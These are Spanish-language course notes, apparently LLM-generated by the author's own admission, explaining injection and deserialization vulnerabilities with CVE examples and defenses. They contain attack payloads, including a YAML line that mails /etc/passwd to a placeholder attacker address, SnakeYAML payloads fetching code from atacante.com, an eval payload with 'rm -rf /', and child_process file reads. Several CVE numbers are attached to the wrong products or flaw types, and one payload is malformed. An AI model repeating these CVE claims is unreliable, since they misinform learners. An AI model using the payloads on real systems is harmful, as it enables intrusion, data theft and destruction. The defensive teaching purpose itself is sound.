* ¬øQu√© es este archivo?

Si bien lo tengo desarrollado en el texto que hemos ido siguiendo, creo que
el tema de inyecciones ‚Äúgana‚Äù mucho de estar vinculado a ejemplos. El texto
a continuaci√≥n es generado por LLM, y si bien verifiqu√© r√°pidamente su
validez... bueno, me arriesgo a meterme el pie yo solito üòâ Estamos todos
advertidos...

* Inyecciones

** Inyecci√≥n de Objetos (Object Injection)

*Descripci√≥n*: Esta vulnerabilidad surge cuando una aplicaci√≥n deserializa
(reconstruye a partir de una cadena de texto) datos no confiables sin la
validaci√≥n adecuada. Un atacante puede manipular el flujo de ejecuci√≥n de
la aplicaci√≥n proporcionando un objeto serializado malicioso. Al
deserializarlo, la aplicaci√≥n ejecuta autom√°ticamente m√©todos espec√≠ficos
de ese objeto (como __wakeup() en PHP o readObject() en Java), lo que puede
llevar a la ejecuci√≥n de c√≥digo arbitrario, inclusi√≥n de archivos o
escalada de privilegios. Es un ataque que convierte datos en c√≥digo
ejecutable.

- [[https://nvd.nist.gov/vuln/detail/CVE-2022-22963][CVE-2022-22963]] (CVSS 9.8) :: En Spring Cloud Function, la inyecci√≥n de
  objetos a trav√©s del encabezado spring.cloud.function.routing-expression
  permit√≠a la Ejecuci√≥n Remota de C√≥digo (RCE).

- [[https://nvd.nist.gov/vuln/detail/CVE-2017-9841][CVE-2017-9841]] (CVSS 9.8) :: En PHPUnit (utilizado en entornos de
  producci√≥n por error), una vulnerabilidad de deserializaci√≥n insegura
  permit√≠a la ejecuci√≥n de c√≥digo PHP arbitrario.

- [[https://nvd.nist.gov/vuln/detail/CVE-2015-7450][CVE-2015-7450]] (CVSS 7.5) :: Una deserializaci√≥n insegura en IBM WebSphere
  Application Server permit√≠a a un atacante ejecutar c√≥digo Java
  arbitrario.

(algunos ejemplos espec√≠ficos de inyecci√≥n en serializaciones v√≠a JSON o
YAML m√°s adelante)

** Inyecci√≥n de C√≥digo (Code Injection)

*Descripci√≥n*: Ocurre cuando un atacante logra inyectar y ejecutar c√≥digo
en un lenguaje interpretado del lado del servidor (como PHP, Python,
Perl). A diferencia de la deserializaci√≥n, aqu√≠ el c√≥digo se inyecta
directamente en una sentencia o funci√≥n que lo eval√∫a din√°micamente (ej:
eval(), system(), exec()). La aplicaci√≥n trata la entrada del usuario como
parte del c√≥digo a ejecutar. El impacto suele ser la ejecuci√≥n directa de
comandos del sistema operativo o c√≥digo de aplicaci√≥n con los privilegios
del servidor.

- [[https://nvd.nist.gov/vuln/detail/CVE-2023-29489][CVE-2023-29489]] (CVSS 9.8) :: En cPanel, una inyecci√≥n de c√≥digo a trav√©s
  del par√°metro api_call permit√≠a a un usuario autenticado ejecutar
  comandos arbitrarios en el sistema como root.

- [[https://nvd.nist.gov/vuln/detail/CVE-2012-1823][CVE-2012-1823]] (CVSS 10.0) :: Una vulnerabilidad cr√≠tica en PHP-CGI donde
  par√°metros de consulta eran interpretados como argumentos de l√≠nea de
  comandos, lo que permit√≠a la inyecci√≥n y ejecuci√≥n de c√≥digo remoto.

- [[https://nvd.nist.gov/vuln/detail/CVE-2023-24078][CVE-2023-24078]] (CVSS 8.8) :: En symfony/serializer de Symfony, un
  atacante pod√≠a lograr la ejecuci√≥n de c√≥digo PHP a trav√©s de la inyecci√≥n
  de una carga √∫til maliciosa.

** Inyecci√≥n de Solicitudes (SSRF - Server-Side Request Forgery)

*Descripci√≥n*: Un atacante obliga a un servidor a realizar solicitudes HTTP
a un destino de su elecci√≥n. Esto explota la funcionalidad de la aplicaci√≥n
para recuperar URLs. Un SSRF exitoso puede usarse para:

- Escaneo de redes internas: Acceder a sistemas internos que no son
  accesibles desde Internet.

- Ataques a servicios internos: Interactuar con servicios sin autenticaci√≥n
  (como paneles de administraci√≥n de bases de datos o APIs internas).

- Filtraci√≥n de datos: Hacer que el servidor env√≠e datos sensibles a un
  servidor controlado por el atacante.

- [[https://nvd.nist.gov/vuln/detail/CVE-2021-29472][CVE-2021-29472]] (CVSS 7.7) :: En el servidor de medios url-get.php de
  WordPress, un atacante pod√≠a realizar solicitudes a servicios internos y
  leer respuestas, lo que pod√≠a llevar a la exposici√≥n de credenciales.

- [[https://nvd.nist.gov/vuln/detail/CVE-2019-8442][CVE-2019-8442]] (CVSS 6.4) :: En Jira, un endpoint de la API permit√≠a a un
  atacante realizar una solicitud SSRF que revelaba informaci√≥n sobre
  servicios internos.

- [[https://nvd.nist.gov/vuln/detail/CVE-2023-38500][CVE-2023-38500]] (CVSS 7.5) :: En la aplicaci√≥n MinIO, una vulnerabilidad
  SSRF de alta severidad permit√≠a a los atacantes ejecutar comandos
  arbitrarios en el entorno de gesti√≥n.

** Inyecci√≥n de Comandos del Sistema Operativo (OS Command Injection)

*Descripci√≥n*: Es uno de los tipos de inyecci√≥n los m√°s cr√≠ticos. Ocurre
cuando una aplicaci√≥n pasa datos no confiables (provenientes del usuario)
directamente a un shell del sistema operativo sin la validaci√≥n o escapado
adecuado. Un atacante puede enga√±ar a la aplicaci√≥n para que ejecute
comandos del sistema operativo arbitrarios con los mismos privilegios que
la propia aplicaci√≥n. El impacto suele ser la total compromisi√≥n del
servidor.

CVEs de Ejemplo:

- [[https://nvd.nist.gov/vuln/detail/CVE-2022-46169][CVE-2022-46169]] (CVSS 9.8) :: Inyecci√≥n de comandos en la funci√≥n
  remote_agent.php de Cacti que permit√≠a ejecuci√≥n remota de c√≥digo sin
  autenticaci√≥n: No validaba adecuadamente el encabezado HTTP_HOST antes de
  pasarlo a funciones del sistema.

- [[https://nvd.nist.gov/vuln/detail/CVE-2023-27326][CVE-2023-27326]] (CVSS 9.8) :: Inyecci√≥n de comandos en PaperCut NG que
  permit√≠a a atacantes no autenticados ejecutar c√≥digo arbitrario por
  entradas de usuario pasadas directamente a procesos del sistema
  operativo.

- [[https://nvd.nist.gov/vuln/detail/CVE-2021-4034][CVE-2021-4034]] (CVSS 7.8) :: Mientras es principalmente un desbordamiento,
  el resultado final es la ejecuci√≥n de comandos del sistema como root en
  polkit, mediante la explotaci√≥n de variables de entorno para ejecutar
  c√≥digo arbitrario.

* Mecanismo de la Inyecci√≥n de Objetos en YAML

YAML es un formato de serializaci√≥n muy potente que no solo describe datos,
sino que puede instanciar objetos arbitrarios y invocar funciones durante
el proceso de deserializaci√≥n. Esto se hace a trav√©s de etiquetas
espec√≠ficas como =!!python/object= o =!!python/object/apply=.

Cuando un parser de YAML (como PyYAML en Python o snakeyaml en Java)
procesa un documento con estas etiquetas sin las debidas restricciones,
crea los objetos y ejecuta las funciones especificadas, lo que puede llevar
directamente a la Ejecuci√≥n Remota de C√≥digo (RCE).  [[https://nvd.nist.gov/vuln/detail/CVE-2017-17522][CVE-2017-17522]] - RCE
en PyYAML

Descripci√≥n: Una vulnerabilidad de Ejecuci√≥n Remota de C√≥digo en el parser
PyYAML a trav√©s de la etiqueta python/object/new. Un atacante capaz de
proporcionar un archivo YAML malicioso a una aplicaci√≥n que use yaml.load()
(en lugar de yaml.safe_load()) puede lograr la ejecuci√≥n de comandos
arbitrarios en el sistema.

Payload de Ejemplo:

#+begin_src yaml
!!python/object/new:os.system
args: ['cat /etc/passwd | mail atacante@malicioso.com']
#+end_src

- =!!python/object/new:os.system= instruye al parser a crear una nueva
  instancia de la clase os.system.

- =args= Proporciona los argumentos para el constructor. En este caso, el
  comando a ejecutar.

*Escenario de Ataque*

- Una aplicaci√≥n web permite a los usuarios subir un archivo de
  configuraci√≥n en YAML.

- La aplicaci√≥n procesa el archivo con =yaml.load(file_content)=.

- Un atacante sube un archivo YAML con el payload mostrado arriba.

- Al deserializarlo, el sistema ejecuta el comando =cat /etc/passwd=.

[[https://nvd.nist.gov/vuln/detail/CVE-2022-1471][CVE-2022-1471]] - RCE en SnakeYAML (Java)

Descripci√≥n: SnakeYAML, el parser de YAML m√°s popular para Java, es
vulnerable a la Deserializaci√≥n Insegura cuando se instancia con la
configuraci√≥n por defecto (usando new Yaml()). Un atacante puede lograr RCE
aprovechando constructores de clases disponibles en el classpath.

Payload de Ejemplo (Generaci√≥n de un ScriptEngine de Java):

#+begin_src yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://atacante.com/malicioso.jar"]
  ]]
]
#+end_src

Este payload es m√°s complejo y suele ser el primer paso. A menudo, los
atacantes utilizan una cadena de gadgets conocidos para lograr RCE de forma
m√°s directa. Un payload m√°s com√∫n y expl√≠cito para RCE ser√≠a uno que
aproveche una clase como
=org.springframework.context.support.ClassPathXmlApplicationContext= para
cargar un contexto XML malicioso desde una URL controlada por el atacante,
lo que luego lleva a la ejecuci√≥n de c√≥digo.

Payload Alternativo y Com√∫n (si =Spring= est√° en el classpath):

#+begin_src yaml
!!org.springframework.context.support.ClassPathXmlApplicationContext
arg: http://atacante.com/context.xml
#+end_src

El archivo =context.xml= contendr√≠a entonces beans maliciosos que ejecutan
c√≥digo.

*Escenario de Ataque*

- Una aplicaci√≥n Java (por ejemplo, un servicio Spring Boot que acepta
  configuraciones en YAML) deserializa datos de usuario usando =new
  Yaml().load()=.

- El atacante env√≠a un payload YAML malicioso como el de arriba.

- SnakeYAML instancia la clase =ClassPathXmlApplicationContext= y carga el
  XML remoto.

- El XML malicioso define beans que ejecutan c√≥digo Java arbitrario, dando
  RCE al atacante.

Ejemplo en el Mundo Real: [[https://nvd.nist.gov/vuln/detail/CVE-2022-1471][CVE-2022-1471]] en Acci√≥n

Software Afectado: GitLab

- CVE: [[https://nvd.nist.gov/vuln/detail/CVE-2023-2825][CVE-2023-2825]] (GitLab) se bas√≥ en la explotaci√≥n de SnakeYAML
  ([[https://nvd.nist.gov/vuln/detail/CVE-2022-1471][CVE-2022-1471]]).

- Vector: Un usuario autenticado pod√≠a importar un proyecto a trav√©s de un
  archivo que conten√≠a un payload YAML malicioso.

- Impacto: Ejecuci√≥n Remota de C√≥digo en el servidor de GitLab.

*Defensa Contra la Inyecci√≥n de Objetos YAML*

La mitigaci√≥n es directa pero debe ser aplicada estrictamente:

- Nunca usar =load()= sin restricciones. En PyYAML, usar
  =yaml.safe_load()=. En SnakeYAML (Java), instanciar el parser con un
  SafeConstructor restringido:
  #+begin_src java
  Yaml yaml = new Yaml(new SafeConstructor()); // ¬°Seguro por defecto!
  #+end_Src

- Validar Estrictamente la Entrada: Si se debe usar una funcionalidad
  potente, validar exhaustivamente el esquema y contenido del YAML antes de
  deserializarlo.

- Actualizar Bibliotecas: Mantener los parsers de YAML actualizados a
  versiones que, por defecto, restrinjan la deserializaci√≥n de tipos
  arbitrarios.

* Mecanismo de la inyecci√≥n de Objetos en JSON

A diferencia de YAML, JSON por s√≠ mismo es un formato de s√≥lo datos y no
permite la ejecuci√≥n de c√≥digo de manera inherente. El peligro surge
cuando:

- Las aplicaciones usan parsers inseguros que extienden JSON con funcionalidades de instanciaci√≥n de objetos.

- Se utiliza eval() o funciones similares para procesar JSON.

- La deserializaci√≥n convierte propiedades JSON en objetos complejos sin validaci√≥n.

** Caso 1: JSONP y Callback Injection

[[https://nvd.nist.gov/vuln/detail/CVE-2021-44906][CVE-2021-44906]] - dojo (JSONP Hijacking)

- Mecanismo: JSONP (JSON with Padding) permite bypass de CORS usando callbacks. Si un endpoint JSONP acepta callback arbitrarios, se puede inyectar c√≥digo JavaScript.

- Payload:
  #+begin_src javascript
  http://api.vulnerable.com/userdata?callback=malicious_function
  #+end_src

- Impacto: Ejecuci√≥n de c√≥digo en el contexto del dominio, robo de datos sensibles.

** Caso 2: Prototype Pollution v√≠a JSON

[[https://nvd.nist.gov/vuln/detail/CVE-2022-25647][CVE-2022-25647]] - node-forge

- Mecanismo: Al mergear objetos JSON profundamente, se puede modificar el prototipo de Object en JavaScript.

- Payload:
  #+begin_src json
  {
    "__proto__": {
      "isAdmin": true,
      "polluted": "yes"
    }
  }
  #+end_src

- Impacto: Modificaci√≥n de comportamiento de la aplicaci√≥n, escalada de privilegios, RCE en combinaci√≥n con otros gadgets.

** Caso 3: Deserializaci√≥n Insegura en Parsers Espec√≠ficos

[[https://nvd.nist.gov/vuln/detail/CVE-2022-25845][CVE-2022-25845]] - fast-json-parse

- Mecanismo: Este parser permit√≠a la ejecuci√≥n de c√≥digo a trav√©s de constructores especiales.

- Payload:
  #+begin_src json
  {
    "key": {"type": "Function", "value": "return process.exit(1)"}
  }
  #+end_src

- Impacto: Denegaci√≥n de servicio o ejecuci√≥n de c√≥digo arbitrario.

** Caso 4: eval() de JSON sin Validar

Ejemplo en Aplicaciones PHP:

#+begin_src php
// ¬°VULNERABLE!
$data = json_decode($_POST['data']);
// Peor a√∫n:
$data = eval("return " . $_POST['data'] . ";");
#+end_src

Payload:
#+begin_src javascript
{"user": "admin", "password": "test"; system('rm -rf /'); //}
#+end_src

** CVEs Destacados de Inyecci√≥n en JSON
[[https://nvd.nist.gov/vuln/detail/CVE-2022-23529][CVE-2022-23529]] - node-serialize

- Severidad: Cr√≠tica (CVSS 9.8)

- Mecanismo: Usaba eval() para reconstruir funciones serializadas en JSON.

- Payload:
  #+begin_src json
  {
    "rce": {"_$$ND_FUNC$$_": "function(){ require('child_process').exec('cat /etc/passwd') }"}
  }
  #+end_src
- Impacto: Ejecuci√≥n remota de c√≥digo inmediata.

[[https://nvd.nist.gov/vuln/detail/CVE-2021-25949][CVE-2021-25949]] - underscore

- Mecanismo: Template injection a trav√©s de manipulaci√≥n de objetos JSON.

- Payload:
  #+begin_src json
  {
    "constructor": {
      "prototype": {
        "sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('cat /etc/passwd')//"
      }
    }
  }
  #+end_src

[[https://nvd.nist.gov/vuln/detail/CVE-2023-26117][CVE-2023-26117]] - mongodb library

- Mecanismo: Inyecci√≥n de operadores de consulta a trav√©s de JSON.

- Payload:
#+begin_src json
{
  "username": {"$ne": "invalid"},
  "password": {"$ne": "invalid"}
}
#+end_src

- Impacto: Bypass de autenticaci√≥n NoSQL injection.

Defensas Contra Inyecci√≥n en JSON

- Usar JSON.parse() nativo: Nunca usar eval() o parsers personalizados que ejecuten c√≥digo.

- Schema Validation: Validar estructura y tipos con JSON Schema antes de procesar.

- Object Creation Safely: No instanciar objetos basados en propiedades JSON sin verificaci√≥n.

- Sanitizaci√≥n de Prototipos:
  #+begin_src javascript
  // Antes de procesar JSON
  if (jsonData.hasOwnProperty('__proto__') || jsonData.hasOwnProperty('constructor')) {
    throw new Error('Prototype pollution attempt');
  }
  #+end_src

- Content-Type estricto: application/json sin interpretaci√≥n como script.

